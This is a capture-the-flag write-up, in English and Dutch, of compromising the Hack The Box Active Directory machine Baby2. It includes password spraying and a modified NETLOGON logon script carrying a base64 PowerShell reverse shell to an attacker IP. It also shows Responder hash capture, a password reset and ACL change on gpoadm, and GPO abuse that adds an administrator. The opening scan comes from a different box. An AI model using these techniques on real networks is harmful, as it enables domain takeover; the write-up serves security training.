# Initial Enumeration
## Port Scanning

### Full Port scan

As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.

```
┌──(kali㉿kali)-[~/HTB/Delegate]
└─$ nmap 10.129.38.251    
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-12 16:59 CET
Nmap scan report for 10.129.38.251
Host is up (0.42s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
3389/tcp open  ms-wbt-server
5985/tcp open  wsman
```
### Detailed port scan

At the detailed port scan go to get more information from the host. 

```
┌──(kali㉿kali)-[~/HTB/BabyTwo]
└─$ nmap -p53,88,135,139,389,445,464,593,636,3389 -sCV 10.129.234.72               
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-13 20:02 CET
Nmap scan report for 10.129.234.72
Host is up (0.063s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-13 19:02:26Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby2.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.baby2.vl, DNS:baby2.vl, DNS:BABY2
| Not valid before: 2025-08-19T14:22:11
|_Not valid after:  2105-08-19T14:22:11
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: baby2.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.baby2.vl, DNS:baby2.vl, DNS:BABY2
| Not valid before: 2025-08-19T14:22:11
|_Not valid after:  2105-08-19T14:22:11
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: BABY2
|   NetBIOS_Domain_Name: BABY2
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: baby2.vl
|   DNS_Computer_Name: dc.baby2.vl
|   DNS_Tree_Name: baby2.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2026-01-13T19:02:33+00:00
|_ssl-date: 2026-01-13T19:03:13+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=dc.baby2.vl
| Not valid before: 2025-08-18T14:29:57
|_Not valid after:  2026-02-17T14:29:57
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-01-13T19:02:35
|_  start_date: N/A

```

Deze box geeft niet veel meer weg. We hebben geen user credentials van HTB gekregen dus zal ik een andere manier moeten zoeken. Hierbij kan je zien dat de smb poort openstaat. Ik ben dus als eerst een keer gaan kijken of dat er met de user anonymous iets speciaals kon gezien worden op de smb server. Zoals je hieronder zult kunnen zien hebben we read en write rechten op de homes shared drive.

```
┌──(kali㉿kali)-[~/HTB/BabyTwo]
└─$ smbmap -H 10.129.234.72 -u anonymous 

[+] IP: 10.129.234.72:445       Name: baby2.vl                  Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        apps                                                    READ ONLY
        C$                                                      NO ACCESS       Default share
        docs                                                    NO ACCESS
        homes                                                   READ, WRITE
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  NO ACCESS       Logon server share 
```

Ik zal dus nu eens gaan kijken wat we op de homes drive te zien krijgen. Ik zal dit gaan doen door gebruik te maken van de smbclient tool.

```
┌──(kali㉿kali)-[~/HTB/BabyTwo]
└─$ smbclient \\\\10.129.234.72\\homes -U anonymous 
Password for [WORKGROUP\anonymous]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Jan 13 20:05:32 2026
  ..                                  D        0  Tue Aug 22 22:10:21 2023
  Amelia.Griffiths                    D        0  Tue Aug 22 22:17:06 2023
  Carl.Moore                          D        0  Tue Aug 22 22:17:06 2023
  Harry.Shaw                          D        0  Tue Aug 22 22:17:06 2023
  Joan.Jennings                       D        0  Tue Aug 22 22:17:06 2023
  Joel.Hurst                          D        0  Tue Aug 22 22:17:06 2023
  Kieran.Mitchell                     D        0  Tue Aug 22 22:17:06 2023
  library                             D        0  Tue Aug 22 22:22:47 2023
  Lynda.Bailey                        D        0  Tue Aug 22 22:17:06 2023
  Mohammed.Harris                     D        0  Tue Aug 22 22:17:06 2023
  Nicola.Lamb                         D        0  Tue Aug 22 22:17:06 2023
  Ryan.Jenkins                        D        0  Tue Aug 22 22:17:06 2023

                6126847 blocks of size 4096. 1091338 blocks available
```

Zoals je hierboven kunt zien staat er niets in de directories. Ik ben dus gaan kijken of ik geen interessante informatie in de Netlogon kon vinden. En yes, daar heb ik iets interessant gevonden. Binnen de netlogon drive kan je zien dat er een login.vbs file staat. Ik zal deze naar mijn eigen machine downloaden en kijken wat voor file het is en wat er in staat. Je kan zien dat de file een VBscript file is. Dit soort files wordt uitgevoerd door een Windows Script Host (WSH).

```
smb: \> get login.vbs
getting file \login.vbs of size 992 as login.vbs (7.8 KiloBytes/sec) (average 7.8 KiloBytes/sec)

```

Nu dat de file is gedownload naar mijn eigen machine en zal ik eens kijken naar wat er in het bestand staat.

```
┌──(kali㉿kali)-[~/HTB/BabyTwo]
└─$ cat login.vbs 
Sub MapNetworkShare(sharePath, driveLetter)
    Dim objNetwork
    Set objNetwork = CreateObject("WScript.Network")    
  
    ' Check if the drive is already mapped
    Dim mappedDrives
    Set mappedDrives = objNetwork.EnumNetworkDrives
    Dim isMapped
    isMapped = False
    For i = 0 To mappedDrives.Count - 1 Step 2
        If UCase(mappedDrives.Item(i)) = UCase(driveLetter & ":") Then
            isMapped = True
            Exit For
        End If
    Next
    
    If isMapped Then
        objNetwork.RemoveNetworkDrive driveLetter & ":", True, True
    End If
    
    objNetwork.MapNetworkDrive driveLetter & ":", sharePath
    
    If Err.Number = 0 Then
        WScript.Echo "Mapped " & driveLetter & ": to " & sharePath
    Else
        WScript.Echo "Failed to map " & driveLetter & ": " & Err.Description
    End If
    
    Set objNetwork = Nothing
End Sub

MapNetworkShare "\\dc.baby2.vl\apps", "V"
MapNetworkShare "\\dc.baby2.vl\docs", "L"   
```

Maar zoals je zelf kunt zien, is er hier ook niet meer informatie wat we eruit kunnen krijgen. Zoals je kan zien is er ook een apps drive waarop we de leesrechten hebben. Ik zal eens gaan kijken op de drive of er daar geen andere information op staat. En zoals je hieronder kan zien heb ik een `login.vbs.lnk` en `CHANGELOG` file gevonden. Ik zal deze gaan downloaden en kijken wat we kunnen vinden van nieuwe informatie.

```
┌──(kali㉿kali)-[~/HTB/BabyTwo]
└─$ smbclient \\\\10.129.234.72\\apps -U anonymous
Password for [WORKGROUP\anonymous]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Sep  7 21:12:59 2023
  ..                                  D        0  Tue Aug 22 22:10:21 2023
  dev                                 D        0  Thu Sep  7 21:13:50 2023

                6126847 blocks of size 4096. 1380013 blocks available
smb: \> cd dev\
smb: \dev\> ls
  .                                   D        0  Thu Sep  7 21:13:50 2023
  ..                                  D        0  Thu Sep  7 21:12:59 2023
  CHANGELOG                           A      108  Thu Sep  7 21:16:15 2023
  login.vbs.lnk                       A     1800  Thu Sep  7 21:13:23 2023
cd
                6126847 blocks of size 4096. 1380357 blocks available
smb: \dev\> get login.vbs.lnk
getting file \dev\login.vbs.lnk of size 1800 as login.vbs.lnk (9.5 KiloBytes/sec) (average 9.5 KiloBytes/sec)
smb: \dev\> get CHANGELOG
getting file \dev\CHANGELOG of size 108 as CHANGELOG (0.8 KiloBytes/sec) (average 5.9 KiloBytes/sec)
```

Zoals je kan zien is er hier ook geen andere informatie dat interessant kan zijn. De enigste oplossing is voor eens te gaan uittesten de users hetzelfde password als hun users gebruikt hebben. Ik ben dus de users allemaal in een file gaan zetten en door gebruik te maken van de netexec tool kan je Hieronder zien dat er 2 correct gevonden user credentials gevonden zijn.

```
┌──(kali㉿kali)-[~/HTB/BabyTwo]
└─$ cat users.txt 
Amelia.Griffiths
Carl.Moore
Harry.Shaw
Joan.Jennings
Joel.Hurst
Kieran.Mitchell
Lynda.Bailey
Mohammed.Harris
Nicola.Lamb
Ryan.Jenkins
library

┌──(kali㉿kali)-[~/HTB/BabyTwo]
└─$ netexec smb baby2.vl -u users.txt -p users.txt --continue-on-success | grep "\[+\]"
SMB                      10.129.234.72   445    DC               [+] baby2.vl\Carl.Moore:Carl.Moore 
SMB                      10.129.234.72   445    DC               [+] baby2.vl\library:library 

┌─[eu-dedivip-2]─[10.10.15.63]─[hackthekat123@htb-bhtrrp7biz]─[~]  
└──╼ [★]$ nxc smb baby2.vl -u library -p library --shares   
SMB         10.129.234.72   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:False)  
SMB         10.129.234.72   445    DC               [+] baby2.vl\library:library  
SMB         10.129.234.72   445    DC               [*] Enumerated shares  
SMB         10.129.234.72   445    DC               Share           Permissions     Remark  
SMB         10.129.234.72   445    DC               -----           -----------     ------  
SMB         10.129.234.72   445    DC               ADMIN$                          Remote Admin  
SMB         10.129.234.72   445    DC               apps            READ,WRITE  
SMB         10.129.234.72   445    DC               C$                              Default share  
SMB         10.129.234.72   445    DC               docs            READ,WRITE  
SMB         10.129.234.72   445    DC               homes           READ,WRITE  
SMB         10.129.234.72   445    DC               IPC$            READ            Remote IPC  
SMB         10.129.234.72   445    DC               NETLOGON        READ            Logon server share  
SMB         10.129.234.72   445    DC               SYSVOL          READ            Logon server share  

┌─[eu-dedivip-2]─[10.10.15.63]─[hackthekat123@htb-bhtrrp7biz]─[~]  
└──╼ [★]$ nxc smb baby2.vl -u Carl.Moore -p Carl.Moore --shares  
SMB         10.129.234.72   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:False)  
SMB         10.129.234.72   445    DC               [+] baby2.vl\Carl.Moore:Carl.Moore  
SMB         10.129.234.72   445    DC               [*] Enumerated shares  
SMB         10.129.234.72   445    DC               Share           Permissions     Remark  
SMB         10.129.234.72   445    DC               -----           -----------     ------  
SMB         10.129.234.72   445    DC               ADMIN$                          Remote Admin  
SMB         10.129.234.72   445    DC               apps            READ,WRITE  
SMB         10.129.234.72   445    DC               C$                              Default share  
SMB         10.129.234.72   445    DC               docs            READ,WRITE  
SMB         10.129.234.72   445    DC               homes           READ,WRITE  
SMB         10.129.234.72   445    DC               IPC$            READ            Remote IPC  
SMB         10.129.234.72   445    DC               NETLOGON        READ            Logon server share  
SMB         10.129.234.72   445    DC               SYSVOL          READ            Logon server share
```

Met deze gegevens ik gaan proberen kijken of ik niet een connectie met de smb server kan maken en dit was met success gelukt success. voor alleer ik verder ga, zal ik met de user de gegevens informatie van de ldap server gaan halen. Dit ben ik gaan doen door gebruik te maken van de volgende tool `nxc`

```
┌──(kali㉿kali)-[~/HTB/BabyTwo]
└─$ nxc ldap 10.129.234.72 -u 'Carl.Moore' -p 'Carl.Moore' --bloodhound --collection All --dns-server 10.129.234.72
LDAP        10.129.234.72   389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:baby2.vl)
LDAP        10.129.234.72   389    DC               [+] baby2.vl\Carl.Moore:Carl.Moore 
LDAP        10.129.234.72   389    DC               Resolved collection methods: container, psremote, objectprops, dcom, acl, localadmin, rdp, session, trusts, group                                                                 
LDAP        10.129.234.72   389    DC               Done in 00M 07S
LDAP        10.129.234.72   389    DC               Compressing output into /home/kali/.nxc/logs/DC_10.129.234.72_2026-01-13_211523_bloodhound.zip 
```

Nu dat dit gebeurd is ben ik de zip file gaan uploaden op bloodhound maar er was geen path te vinden die ik verder kon gebruiken. Dus ik ben het login.vbs bestand gaan aanpassen en er een revshell van gaan maken. Dit zodat ik inlog met de user `Carl.Moore` of `library` op de SYSVOL shared drive, ik het bestand dat er al opstond kan verwijderen en het nieuwe bestand erop kan zetten. Door mijn listener optestarten ben ik tot de connectie naar de windows machine geraakt.
Ik heb de file aangepast naar het volgende:
https://www.revshells.com/
```
cat login.vbs  
Sub MapNetworkShare(sharePath, driveLetter)  
    Dim objNetwork  
    Set objNetwork = CreateObject("WScript.Network")      
  
    ' Check if the drive is already mapped  
    Dim mappedDrives  
    Set mappedDrives = objNetwork.EnumNetworkDrives  
    Dim isMapped  
    isMapped = False  
    For i = 0 To mappedDrives.Count - 1 Step 2  
        If UCase(mappedDrives.Item(i)) = UCase(driveLetter & ":") Then  
            isMapped = True  
            Exit For  
        End If  
    Next  
  
    If isMapped Then  
        objNetwork.RemoveNetworkDrive driveLetter & ":", True, True  
    End If  
  
    objNetwork.MapNetworkDrive driveLetter & ":", sharePath  
  
    If Err.Number = 0 Then  
        WScript.Echo "Mapped " & driveLetter & ": to " & sharePath  
    Else  
        WScript.Echo "Failed to map " & driveLetter & ": " & Err.Description  
    End If  
  
    Set objNetwork = Nothing  
End Sub

MapNetworkShare "\\dc.baby2.vl\apps", "V"  
MapNetworkShare "\\dc.baby2.vl\docs", "L"  
Dim objShell  
Set objShell = CreateObject("WScript.Shell")  
objShell.Run "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMQA1ADQAIgAsADkAMAAwADEAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA" , 0, False  
Set objShell = Nothing
```

Achter het aanpassen van de file, ben ik deze gaan uploaden op de server, een listener opgestart en afgewacht tot wanneer de connectie tot stand kwam.

```
─[eu-dedivip-2]─[10.10.15.63]─[hackthekat123@htb-bhtrrp7biz]─[~]  
└──╼ [★]$ smbclient \\\\baby2.vl\\SYSVOL -U Carl.Moore%Carl.Moore  
Try "help" to get a list of possible commands.  
smb: \> ls  
  .                                   D        0  Tue Aug 22 12:37:36 2023  
  ..                                  D        0  Tue Aug 22 12:37:36 2023  
  baby2.vl                           Dr        0  Tue Aug 22 12:37:36 2023

    6126847 blocks of size 4096. 1960001 blocks available  
smb: \> cd baby2.vl  
smb: \baby2.vl\> ls  
  .                                   D        0  Tue Aug 22 12:43:55 2023  
  ..                                  D        0  Tue Aug 22 12:37:36 2023  
  DfsrPrivate                      DHSr        0  Tue Aug 22 12:43:55 2023  
  Policies                            D        0  Tue Aug 22 12:37:41 2023  
  scripts                             D        0  Mon Aug 25 03:30:39 2025

    6126847 blocks of size 4096. 1960001 blocks available  
smb: \baby2.vl\> cd scripts  
smb: \baby2.vl\scripts\> ls  
  .                                   D        0  Mon Aug 25 03:30:39 2025  
  ..                                  D        0  Tue Aug 22 12:43:55 2023  
  login.vbs                           A      992  Sat Sep  2 09:55:51 2023

    6126847 blocks of size 4096. 1960001 blocks available  
smb: \baby2.vl\scripts\> del login.vbs   
smb: \baby2.vl\scripts\> put login.vbs  
putting file login.vbs as \baby2.vl\scripts\login.vbs (65.2 kb/s) (average 65.2 kb/s)
```

Op de listener kan je zien dat ik de connectie heb gemaakt naar de windows machine.

```
┌─[eu-dedivip-2]─[10.10.15.63]─[hackthekat123@htb-3pszu1yqrz]─[~]  
└──╼ [★]$ nc -lvnp 9001  
listening on [any] 9001 ...  
connect to [10.10.15.63] from (UNKNOWN) [10.129.234.72] 50673
```

Ik ben gaan kijken met welke user de connectie gemaakt is geweest en daar kan je zien dat ik de user Amelia ben. Ik ben dan gaan zoeken naar de user flag en heb deze gevonden niet op de normale plaats maar het stond gewoon in de `C:\` drive.

```
PS C:\Users> whoami  
baby2\amelia.griffiths

PS C:\Users> cd ..  
PS C:\> ls

    Directory: C:\

Mode                 LastWriteTime         Length Name                                                                   
----                 -------------         ------ ----                                                                   
d-----         4/16/2025   2:27 AM                inetpub                                                                
d-----          5/8/2021   1:20 AM                PerfLogs                                                               
d-r---         4/16/2025   1:51 AM                Program Files                                                          
d-----         8/22/2023  10:30 AM                Program Files (x86)                                                    
d-----         8/22/2023   1:10 PM                shares                                                                 
d-----         8/22/2023  12:35 PM                temp                                                                   
d-r---         8/22/2023  12:54 PM                Users                                                                  
d-----         8/20/2025   9:05 AM                Windows                                                                
-a----         4/16/2025   2:48 AM             32 user.txt                                                             

PS C:\> cat user.txt  
42783b2c1483aeb70eca6810f0645c38
```

ntlm hash capturing gaan doen. Hieraan zal je kunnen zien dat het een ntlmv1 hash is en deze niet gemakkelijk zijn voor te cracken. Je zal deze eerst naar de standaard ntlm moeten omzetten voor het cracken van de hash. Hieronder laat ik de stappen zien dat je kan gebruiken voor de NTLM hash te krijgen. We zijn nog steeds ingeloged met de user amelia.griffiths, We gaan op een andere terminal een responder openen. Daarop zal je de ntlm hash krijgen. Je kan de onderstaande commando's doen.

Connectie met amelia.griffiths

```
whoami
baby2\amelia.griffiths
PS C:\Windows\system32> net use \\10.10.16.154\share
```

Responder

```
┌──(kali㉿kali)-[~/HTB/BabyTwo]
└─$ sudo responder -I tun0

[SMB] NTLMv1-SSP Hash     : Amelia.Griffiths::BABY2:6D884DE3BF10003000000000000000000000000000000000:7E5EEEF5DE5D649574C9D42015571A7C3BF60115F8B98352:2532e99d6c6defe8
```

Ik zal nu deze proberen converteren naar een normale hash. Maar dit heeft naar een dood path geleid. Er blijven errors opkomen en je kan de hash niet cracken. Ik ben dan eens gaan kijken naar het shortest path to domain admins. Hieronder kan je het path zien.

![[Pasted image 20260115201232.png]]

Wat ik dus zal moeten doen is het password van de `gpoadm` user aanpassen. Eens dat het password is aangepast, zal ik het object gaan toevoegen aan het domain. Eens dat dit gedaan is kunnen we de GPO gaan abuse, hiervoor zal je het gpo-id nodig hebben. Voor dit te vinden ben ik gebruik gaan maken van de volgende tool: https://github.com/X-C3LL/GPOwned
Daar zal je de gpo id kunnen vinden en ben ik de gpoabuse gaan starten. Binnen de gpo abuse zal je door gebruik te maken van een command je eigen kunnen toevoegen aan de administrators groep waardoor je erna een connectie zal kunnen maken met de machine door gpoadm te gebruiken die de admin rechten heeft. Ik ben de gpo abuse gaan doen door gebruik te maken van de volgende tool: https://github.com/Hackndo/pyGPOAbuse

### Change gpoadm password and add DomainObjectACL

```
$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainTect -Force
PS C:\temp> Set-DomainUserPassword -Identity gpoadm -AccountPassword $UserPassword
PS C:\temp> Add-DomainObjectAcl -TargetIdentity "gpoadm" -PrincipalIdentity amelia.griffiths -Domain baby2.vl -Rights All -Verbose
```

### Retrieving gpo id

```
┌──(kali㉿kali)-[~/HTB/BabyTwo]
└─$ python3 GPOwned.py -u gpoadm -p 'Password123!' -d baby2.vl -dc-ip 10.129.234.72 -gpcmachine -listgpo
                GPO Helper - @TheXC3LL
                Modifications by - @Fabrizzio53


[*] Connecting to LDAP service at 10.129.234.72
[*] Requesting GPOs info from LDAP

[+] Name: {31B2F340-016D-11D2-945F-00C04FB984F9}
        [-] displayName: Default Domain Policy
        [-] gPCFileSysPath: \\baby2.vl\sysvol\baby2.vl\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}
        [-] gPCMachineExtensionNames: [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{53D6AB1B-2488-11D1-A28C-00C04FB94F17}][{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}][{B1BE8D72-6EAC-11D2-A4EA-00C04F79F83A}{53D6AB1B-2488-11D1-A28C-00C04FB94F17}]
        [-] versionNumber: 30
        [-] Verbose: 
                ---             ---
                Registry Settings
                EFS Policy
                ---             ---
                Security
                Computer Restricted Groups
                ---             ---
                EFS Recovery
                EFS Policy

[+] Name: {6AC1786C-016F-11D2-945F-00C04fB984F9}
        [-] displayName: Default Domain Controllers Policy
        [-] gPCFileSysPath: \\baby2.vl\sysvol\baby2.vl\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}
        [-] gPCMachineExtensionNames: [{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]
        [-] versionNumber: 2
        [-] Verbose: 
                ---             ---
                Security
                Computer Restricted Groups

[^] Have a nice day!

```

### GPOabuse for escalation

```
┌──(kali㉿kali)-[~/HTB/BabyTwo/pyGPOAbuse]
└─$ python3 pygpoabuse.py baby2.vl/gpoadm:'Password123!' -gpo-id 31B2F340-016D-11D2-945F-00C04FB984F9 -dc-ip 10.129.234.72 -v -command 'net localgroup administrators /add gpoadm'
[*] Version updated
[+] ScheduledTask TASK_62cfb0ff created!
```

### Logging in as gpoadm

```
┌──(kali㉿kali)-[~/HTB/BabyTwo/ntlmv1-multi]
└─$ evil-winrm -i 10.129.234.72 -u gpoadm -p 'Password123!'

*Evil-WinRM* PS C:\Users\gpoadm\Documents>

*Evil-WinRM* PS C:\Users\gpoadm\Documents> net user gpoadm 
User name                    gpoadm
Full Name                    gpoadm
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/15/2026 11:20:40 AM
Password expires             Never
Password changeable          1/16/2026 11:20:40 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   1/15/2026 11:20:45 AM

Logon hours allowed          All

Local Group Memberships      *Administrators
Global Group memberships     *Domain Users

```

### ROOTED

```
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
293500962edc31fa154951eeeb5740f9
```

![[Pasted image 20260115204853.png]]